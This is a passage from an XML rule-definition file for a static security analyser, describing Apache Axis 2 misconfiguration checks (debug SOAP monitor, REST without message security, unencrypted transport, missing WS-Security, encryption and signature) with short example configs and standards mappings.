																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 11</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13]  <em>JavaDoc for Android</em> Android<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M10 Lack of Binary Protections</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_misconfiguration_debug_information</key>
		<internalKey>Environment/Axis 2 Misconfiguration/Debug Information
		</internalKey>
		<name>Axis 2 Misconfiguration: Debug Information</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The SOAP Monitor module allows attackers to sniff SOAP traffic.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Apache Axis 2 provides developers with a utility to monitor incoming and outgoing SOAP messages through a Java applet. The SOAP Monitor will show all SOAP messages used to invoke a Web Service. Attackers can use the utility to eavesdrop on traffic between a Web Service and its clients.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 215</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>
																									   <p>[19]  <em>Using the SOAP Monitor</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_misconfiguration_insecure_message_security
		</key>
		<internalKey>Environment/Axis 2 Misconfiguration/Insecure Message
			Security
		</internalKey>
		<name>Axis 2 Misconfiguration: Insecure Message Security</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Apache Axis 2 is configured to use REST, and REST does not have message security standards.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If a service relays messages to other services, the messages are exposed to the weakest transport mechanism used between relay points. REST by itself does not include any security mechanisms, so this service relies on the transport layer for message integrity and confidentiality.<br><br>The following configuration enables REST:<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>    &lt;parameter name=&quot;disableREST&quot; locked=&quot;true&quot;&gt;false&lt;/parameter&gt;<br>...<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis2</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_misconfiguration_insecure_transport_receiver
		</key>
		<internalKey>Environment/Axis 2 Misconfiguration/Insecure Transport
			Receiver
		</internalKey>
		<name>Axis 2 Misconfiguration: Insecure Transport Receiver</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The configuration should ensure SSL is required for access to sensitive information.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an application handles sensitive information and does not use message-level encryption, then it should only be allowed to communicate over an encrypted transport channel.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis2 Configuration Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[13]  <em>HTTP Transport</em> Apache Software Foundation<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_misconfiguration_insecure_transport_sender
		</key>
		<internalKey>Environment/Axis 2 Misconfiguration/Insecure Transport
			Sender
		</internalKey>
		<name>Axis 2 Misconfiguration: Insecure Transport Sender</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The configuration should ensure SSL is required for access to sensitive information.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an application handles sensitive information and does not use message-level encryption, then it should only be allowed to communicate over an encrypted transport channel. The <code>&lt;transportSender&gt;</code> tag should not specify <code>http</code>, because communication with this URL will not be encrypted.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis2 Configuration Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[13]  <em>HTTP Transport</em> Apache Software Foundation<br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_inbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Inbound WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Inbound WS-Security
			Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't require WS-Security might not be able to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and secures the message itself.<br><br> The absence of an <code>InflowSecurity</code> parameter in the Apache Axis 2 configuration file indicates that inbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SC</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_inbound_encryption
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Inbound Encryption
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Inbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The following Apache Axis 2 Rampart configuration does not require inbound messages to be encrypted since the <code>&lt;items&gt;</code> tag does not contain an <code>Encrypt</code> directive:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Signature&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre><br><br>Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_inbound_signature
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Inbound Signature
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Inbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  If a message is not signed, the integrity the message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without being detected by the receiver. Without a signature, a receiver cannot cryptographically verify that the contents of a message are authentic.<br><br>The following service provider configuration tells Axis 2 to accept unsigned messages:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_inbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Inbound Timestamp
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp leaves SOAP messages open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
